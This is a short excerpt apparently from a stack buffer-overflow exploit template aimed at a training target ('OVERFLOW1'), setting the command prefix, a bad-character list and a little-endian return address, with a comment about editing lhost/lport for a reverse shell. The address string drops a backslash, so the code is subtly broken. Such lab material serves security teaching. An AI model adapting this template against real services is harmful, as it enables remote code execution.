...
###Change esp, offset, badchars, cmd, lhost/lport, and addr
...
# Space after cmd name is important
cmd = "OVERFLOW1 "
...
bad = "\x00\x07\x08\x2e\x2f\xa0\xa1" 

#This address will be written in reverse per 2 characters ex/ 12345678 becomes x78\x56\x34\x12 (without the spaces).
esp = "xaf\x11\x50\x62"  
